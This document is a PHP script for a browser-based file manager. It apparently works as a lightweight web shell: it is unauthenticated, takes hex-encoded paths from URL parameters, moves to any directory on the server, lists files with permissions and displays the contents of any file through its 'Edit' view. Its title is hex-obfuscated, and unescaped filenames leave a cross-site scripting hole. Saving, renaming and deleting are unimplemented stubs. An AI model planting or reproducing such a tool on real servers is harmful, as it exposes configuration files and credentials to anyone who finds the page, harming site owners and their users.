<?php
function files($dir, $type) {
	$result = [];
	foreach (@scandir($dir) as $key => $value) {
		$file['names'] = $dir. DIRECTORY_SEPARATOR .$value;
		switch ($type) {
			case 'dir':
				if (!is_dir($file['names']) || $value === '.' || $value === '..') continue 2;
				break;
			
			case 'file':
				if (!is_file($file['names'])) continue 2;
				break;
		}
		$file['fname'] = basename($file['names']);
		$file['fsize'] = is_dir($file['names']) ? @filetype($file['names']) : size($file['names']);
		$file['ftime'] = ftime($file['names']);
		$result[] = $file;
	}
	return $result;
}
function hex($string) {
	$str = "";
	for ($i=0; $i < strlen($string); $i++) { 
		$str .= dechex(ord($string[$i]));
	} return $str;
}
function unhex($hex) {
	$unhex = "";
	for ($i=0; $i < strlen($hex)-1; $i+=2) { 
		$unhex .= chr(hexdec($hex[$i].$hex[$i+1]));
	} return $unhex;
}

function pwd() {
	$dir = preg_split("/(\\\|\/)/", getcwd());
	?>
	<nav aria-label="breadcrumb">
  		<ol class="breadcrumb">
  			<?php
  			foreach ($dir as $key => $value) {
  				if($value=='' && $key==0) {
  					echo '<li class="breadcrumb-item"><a href="?v=2f">/</a></li>';
  				}
  				if($value == '') { 
  					continue;
  				}
  				echo '<li class="breadcrumb-item"><a href="?v=';
  				for ($i = 0; $i <= $key; $i++) {
  					echo hex($dir[$i]); 
  					if($i != $key) {
  						echo '2f';
  					}
  				}
  				print('">'.$value.'</a></li>');
  			}
  			?>
		</ol>
	</nav>
	<?php
}
function text($number) {
	switch ($number) {
		case 1:
			return unhex("50485046696c656d616e61676572");
			break;
		case 2:
			return "";
			break;
	}
}
function size($filename) {
	if (is_file($filename)) {
		$filepath = $filename;
		if(!realpath($filepath)) {
			$filepath = $_SERVER['DOCUMENT_ROOT'].$filepath;
		}
		$filesize = filesize($filepath);
		$array = [" TB"," GB"," MB"," KB"," Byte"];
		$total = count($array);
		while($total -- && $filesize > 1024) {
			$filesize /= 1024;
		} return round($filesize,2)."".$array[$total];
	}
}
function perms($filename) {
	$perms = @fileperms($filename);
	switch ($perms & 0xf000) {
		case 0xc000:$info = 's';break;
		case 0xa000:$info = 'l';break;
		case 0x8000:$info = 'r';break;
		case 0x6000:$info = 'b';break;
		case 0x4000:$info = 'd';break;
		case 0x2000:$info = 'c';break;
		case 0x1000:$info = 'p';break;
		default:$info = 'u';
	}
    $info .= $perms & 0x0100 ? 'r' : '-';
    $info .= $perms & 0x0080 ? 'w' : '-';
    $info .= $perms & 0x0040 ? ($perms & 0x0800? 's': 'x'): ($perms & 0x0800 ? 'S': '-');
    $info .= $perms & 0x0020 ? 'r' : '-';
    $info .= $perms & 0x0010 ? 'w' : '-';
    $info .= $perms & 0x0008 ? ($perms & 0x0400? 's': 'x'): ($perms & 0x0400 ? 'S': '-');
    $info .= $perms & 0x0004 ? 'r' : '-';
    $info .= $perms & 0x0002 ? 'w' : '-';
    $info .= $perms & 0x0001 ? ($perms & 0x0200 ? 't': 'x'): ($perms & 0x0200 ? 'T': '-');
    return $info;
}
function wr($filename, $perms) {
	if (is_writable($filename)) {
		print("<font color='green'>{$perms}</font>");
	} else {
		print("<font color='red'>{$perms}</font>");
	}
}
function getext($filename) {
	return strtolower(pathinfo($filename, PATHINFO_EXTENSION));
}
function geticon($filename) {
	switch (getext($filename)) {
        case 'php1':
        case 'php2':
        case 'php3':
        case 'php4':
        case 'php5':
        case 'php6':
        case 'phtml':
        case 'php':
        	return ('https://www.flaticon.com/svg/static/icons/svg/2306/2306154.svg');break;
        case 'html':
        case 'htm':
        	return ('https://www.flaticon.com/svg/static/icons/svg/2306/2306098.svg');break;
        case 'css':
        	return ('https://www.flaticon.com/svg/static/icons/svg/2306/2306041.svg');break;
        case 'js':
        	return ('https://www.flaticon.com/svg/static/icons/svg/2306/2306122.svg');break;
        case 'json':
        	return ('https://image.flaticon.com/icons/svg/136/136525.svg');break;
        case 'xml':
        	return ('https://www.flaticon.com/svg/static/icons/svg/2306/2306209.svg');break;
        case 'py':
        	return ('https://www.flaticon.com/svg/static/icons/svg/2721/2721287.svg');break;
        case 'zip':
        	return ('https://www.flaticon.com/svg/static/icons/svg/2306/2306214.svg');break;
        case 'rar':
        	return ('https://www.flaticon.com/svg/static/icons/svg/2306/2306170.svg');break;
        case 'htaccess':
        	return ('https://image.flaticon.com/icons/png/128/1720/1720444.png');break;
        case 'txt':
        	return ('https://www.flaticon.com/svg/static/icons/svg/2306/2306185.svg');break;
        case 'ini':
        	return ('https://image.flaticon.com/icons/svg/1126/1126890.svg');break;
        case 'mp3':
        	return ('https://www.flaticon.com/svg/static/icons/svg/2306/2306139.svg');break;
        case 'mp4':
        	return ('https://www.flaticon.com/svg/static/icons/svg/2306/2306142.svg');break;
        case 'log':
        case 'log1':
        case 'log2':
        	return ('https://www.flaticon.com/svg/static/icons/svg/2306/2306124.svg');break;
        case 'psd':
        	return ('https://www.flaticon.com/svg/static/icons/svg/2306/2306166.svg');break;
        case 'dat':
        	return ('https://www.flaticon.com/svg/static/icons/svg/2306/2306050.svg');break;
        case 'exe':
        	return ('https://www.flaticon.com/svg/static/icons/svg/2306/2306085.svg');break;
        case 'apk':
        	return ('https://www.flaticon.com/svg/static/icons/svg/2306/2306016.svg');break;
        case 'yaml':
        	return ('https://cdn1.iconfinder.com/data/icons/hawcons/32/698694-icon-103-document-file-yml-512.png');break;
        case 'xlsx':
        	return ('https://www.flaticon.com/svg/static/icons/svg/2306/2306200.svg');break;
        case 'bak':
        	return ('https://image.flaticon.com/icons/svg/2125/2125736.svg');break;
        case 'ico':
        	return ('https://www.flaticon.com/svg/static/icons/svg/2306/2306102.svg');break;
        case 'png':
        	return ('https://www.flaticon.com/svg/static/icons/svg/2306/2306156.svg');break;
        case 'jpg':
        case 'webp':
        	return ('https://www.flaticon.com/svg/static/icons/svg/2306/2306117.svg');break;
        case 'jpeg':
        	return ('https://www.flaticon.com/svg/static/icons/svg/2306/2306114.svg');break;
        case 'svg':
        	return ('https://www.flaticon.com/svg/static/icons/svg/2306/2306179.svg');break;
        case 'gif':
        	return ('https://www.flaticon.com/svg/static/icons/svg/2306/2306094.svg');break;
        case 'pdf':
        	return ('https://www.flaticon.com/svg/static/icons/svg/2306/2306145.svg');break;
        case 'asp':
        	return ("https://www.flaticon.com/svg/static/icons/svg/2306/2306019.svg");break;
        case 'doc':
        	return ("https://www.flaticon.com/svg/static/icons/svg/2306/2306060.svg");break;
        case 'docx':
        	return ("https://www.flaticon.com/svg/static/icons/svg/2306/2306065.svg");break;
        case 'otf':
        	return ("https://www.flaticon.com/svg/static/icons/svg/2306/2306149.svg");break;
        case 'ttf':
        	return ("https://www.flaticon.com/svg/static/icons/svg/2306/2306182.svg");break;
        case 'wav':
        	return ("https://www.flaticon.com/svg/static/icons/svg/2306/2306188.svg");break;
        case 'sql':
        	return ("https://www.flaticon.com/svg/static/icons/svg/2306/2306173.svg");break;
        case 'csv':
        	return ("https://www.flaticon.com/svg/static/icons/svg/2306/2306046.svg");break;
        case 'bat':
        	return ("https://www.flaticon.com/svg/static/icons/svg/2306/2306025.svg");break;
        default:
        	return ('https://image.flaticon.com/icons/svg/833/833524.svg');break;
    }
}
function alert($msg) {
	?>
	<div id="jAlRem">
    <div id="jAlert">
        <table id="jAlert_table">
            <tr id="jAlert_tr">
                <td id="jAlert_td">  <p id="jAlert_content"></p>  </td>
                <td id="jAlert_td">  <button id='jAlert_ok'  onclick="jAlertagree()"></button>  </td>
            </tr>
        </table>
    </div>
</div>
	<script>
	function jAlert(text, customokay){
	document.getElementById('jAlert_content').innerHTML = text;
    document.getElementById('jAlert_ok').innerHTML = customokay;
    document.body.style.backgroundColor = "gray";
    document.body.style.cursor="wait";
}
function jAlertagree(){
    var parent = document.getElementById('jAlRem');
    var child = document.getElementById('jAlert');
    parent.removeChild(child);
    document.body.style.backgroundColor="white";
    document.body.style.cursor="default";
}
jAlert("Stop! Stop!", "<b>Okay!</b>");
</script>
	<?php
}
function ftime($filename) {
	return date("d M Y H:i:s", @filemtime($filename));
}
function freadd($filename) {
	return htmlspecialchars(file_get_contents($filename));
}
function fredit($filename, $data) {}
if (isset($_GET['v'])) {
	$cd = unhex($_GET['v']);
	@chdir(unhex($_GET['v']));
}
?>

<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
<script type="text/javascript" src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
</script>
<style type="text/css">
	body {
		overflow: hidden;
		padding-top:25px;
		padding-bottom:25px;
	}
	.icon {
		width: 30px;
		height: 30px;
	}
	.buntel {
		padding-left:20px;
		padding-right:20px;
	}
	.buntel table td {
		padding-bottom:10px;
	}
	.clickable:hover {
		cursor: pointer;
	}
	#jAlert_table, #jAlert_th, #jAlert_td{
    border: 2px solid blue;
    background-color:lightblue;
    border-collapse: collapse;
    width:100px;
}

#jAlert_th, #jAlert_td{
    padding:5px;
    padding-right:10px;
    padding-left:10px;
}

#jAlert{
    /* Position fixed */
    position:fixed;
    /* Center it! */
    top: 50%;
    left: 50%;
    margin-top: -50px;
    margin-left: -100px;
}
</style>
<script type="text/javascript">
	jQuery(document).ready(function($) {
		$(".clickable").click(function() {
			window.location = $(this).data("href");
		});
	});
</script>
<div class="container">
	<div class="card" style="max-height:100%;">
		<div class="card-body">
			<h5 class="card-title"><?= text(1) ?></h5>
			<p class="card-text"><?= pwd() ?></p>
		</div>
		<?php
		@$_GET['file'] = unhex($_GET['file']);
		switch (@$_GET['a']) {
			case 'e':
			print(alert('sad'));
				?>
				<div class="buntel">
				<table class="tablet" width="100%">
					<tr>
						<td>Filename</td>
						<td>:</td>
						<td><?= wr(basename($_GET['file']), basename($_GET['file'])) ?></td>
					</tr>
					<tr>
						<td>Last Modified</td>
						<td>:</td>
						<td><?= ftime($_GET['file'])?></td>
					</tr>
					<form method="post">
						<tr>
							<td colspan="3">
								<textarea class="form-control" rows="25" name="date"><?= freadd($_GET['file']) ?></textarea>
							</td>
						</tr>
						<tr>
							<td colspan="3">
								<input class="btn btn-outline-success" type="submit" name="submit" value="Save">
							</td>
						</tr>
					</form>
				</table>
				</div>
				<?php
				exit();
				break;
		}
		?>
		<div class="card-body scroll" style="padding: 0;max-height:100%;overflow-y: auto;">
		<ul class="list-group list-group-flush">
			<?php
			foreach (files(getcwd(), 'dir') as $key => $value) { ?>
				<li class="list-group-item">
					<div class="row" title='<?= $value['fname'] ?>'>
						<div class="col text-truncate clickable" data-href='?v=<?= hex($value['names']) ?>'>
							<img class="icon" src="https://image.flaticon.com/icons/svg/715/715676.svg"> 
							<?= $value['fname'] ?>
						</div>
						<div class="col clickable" data-href='?v=<?= hex($value['names']) ?>' title='<?= $value['fname'] ?>'>
							<?= $value['fsize'] ?>
						</div>
						<div class="col clickable" data-href='?v=<?= hex($value['names']) ?>' title='<?= $value['fname'] ?>'>
							<?= wr($value['fname'], perms($value['fname'])) ?>
						</div>
						<div class="col clickable" data-href='?v=<?= hex($value['names']) ?>' title='<?= $value['fname'] ?>'>
							<?= $value['ftime'] ?>
						</div>
						<div class="col-2">
							<div class="dropdown">
								<a style="width:100%;" class="btn btn-outline-info btn-sm dropdown-toggle" href="#" role="button" id="dropdownMenuLink" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Action</a>
								<div class="dropdown-menu" aria-labelledby="dropdownMenuLink">
									<a class="dropdown-item" href="#">Rename</a>
									<a class="dropdown-item" href="#">Delete</a>
								</div>
							</div>
						</div>
					</div>
				</li>
			<?php }
			foreach (files(getcwd(), 'file') as $key => $value) { ?>
				<li class="list-group-item">
					<div class="row" title='<?= $value['fname'] ?>' >
						<div class="col text-truncate">
							<img class="icon" src="<?= geticon($value['names']) ?>"> 
							<?= $value['fname'] ?>
						</div>
						<div class="col">
							<?= $value['fsize'] ?>
						</div>
						<div class="col">
							<?= wr($value['fname'], perms($value['fname'])) ?>
						</div>
						<div class="col">
							<?= $value['ftime'] ?>
						</div>
						<div class="col-2">
							<div class="dropdown">
								<a style="width:100%;" class="btn btn-outline-info btn-sm dropdown-toggle" href="#" role="button" id="dropdownMenuLink" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Action</a>
								<div class="dropdown-menu" aria-labelledby="dropdownMenuLink">
									<a class="dropdown-item" href="?v=<?=hex(getcwd())?>&a=e&file=<?=hex($value['names'])?>">
										Edit
									</a>
									<a class="dropdown-item" href="#">Rename</a>
									<a class="dropdown-item" href="#">Delete</a>
									<a class="dropdown-item" href="#">Download</a>
								</div>
							</div>
						</div>
					</div>
				</li>
			<?php }
			?>
		</ul>
		</div>
	</div>
</div>
